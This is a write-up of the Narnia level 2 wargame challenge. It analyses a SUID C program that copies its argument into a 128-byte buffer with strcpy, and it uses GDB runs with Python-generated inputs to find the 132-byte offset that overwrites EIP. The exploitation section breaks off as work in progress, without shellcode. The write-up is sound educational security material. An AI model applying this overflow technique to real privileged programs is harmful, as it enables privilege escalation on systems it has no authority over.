# Overview
After gaining SSH access to the user `narnia2`, we can read and execute the files related to the new challenge in `/narnia/narnia2`.
By simply running the program we get this output:
```bash
narnia2@narnia:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@narnia:/narnia$
```
We can give it a random argument to see what happens:
```bash
narnia2@narnia:/narnia$ ./narnia2 thisisnarnia
thisisnarnianarnia2@narnia:/narnia$
```
So it is just printing out our argument as a string. We'll look at the source code for a better analysis.

# Code Analysis
## Source Code
Below is the source code found in `/narnia/narnia2.c`:
```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```
The first line inside `main` is `char buf[128]` declaring a char buffer of 128 bytes size.<br>
In the `if` block it is just checking if the user have typed some argument, and printing the "Usage" message.<br>
The last part of the code is copying the contents of the first argument (`argv[0]` is always the program's name/path) inside `buf`: `strcpy(buf,argv[1])`, and then sending it to the output: `printf("%s", buf)`.
## Security Flaws
We have a common and easy-solvable security flaw here. First we have to remember that at this point all the challenges we've seen in Narnia have the SUID set, so each program runs as the right superior user - in this case, as narnia3.
So if we run a shell inside this program, we have it as narnia3 too. In second, the source code shows that the program is just copying the contents of the first argument inside `buf` without checking or correcting it's size. So if our argument is more than 128 bytes long, the program will have a **buffer overflow** and strange things will happen.
So let's now use **GDB** to see what kind of "strange" behaviour the program can have.
## Debugging
After starting GDB with `gdb narnia2` , i'll use `set disassembly-flavor intel` for a more human-readable assembly displaying.<br>
We can now use `python3` for an easy test of the buffer-overflow's consequences in runtime. First, let's check what happens with an exact 128 byte long input (128 A's): 
```GDB
(gdb) r $(python3 -c "print('A'*128)")
Starting program: /narnia/narnia2 $(python3 -c "print('A'*128)")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 26) exited normally]
```
Nothing interest happened. Let's try a 140 byte long argument:
```GDB
(gdb) r $(python3 -c "print('A'*140)")
Starting program: /narnia/narnia2 $(python3 -c "print('A'*140)")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
Now we have something. Look at this "Segmentation Fault" message, it is telling us that our argument has made the program try to access a non-authorized memory region. And the next line is confirming it, saying that the program tried to execute a function at `0x41414141`.<br>
Remember that 41 is the ASCII code for "A", so this means that our buffer-overflow is ovewriting the four bytes of EIP (instruction pointer) and then executing what is in this address.<br>
We have to know what point of our payload of A's completely ovewrites the EIP, so let's try a few sizes.
```GDB
(gdb) r $(python3 -c "print('A'*130)")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 25) exited normally]

(gdb) r $(python3 -c "print('A'*135)")

Program received signal SIGSEGV, Segmentation fault.
0x00414141 in ?? ()

(gdb) r $(python3 -c "print('A'*136)")
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
With exact 136 bytes, the argument causes a **buffer overflow** that ovewrites EIP. The bytes after the 132° are the four ones that causes the ovewrite. If we change them to B, we can confirm this thesis:
```GDB
(gdb) r $(python3 -c "print('A'*132+'B'*4)")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
And voilá, our EIP is now pointing to 0X42424242 (BBBB)! We can intentionally choose which address the program will execute.
# Exploitation
Now that we have control over EIP we can use `buf` to inject shellcode (as we did with env-vatiables in the last challenge) at the program's memory. (Work in Progress)
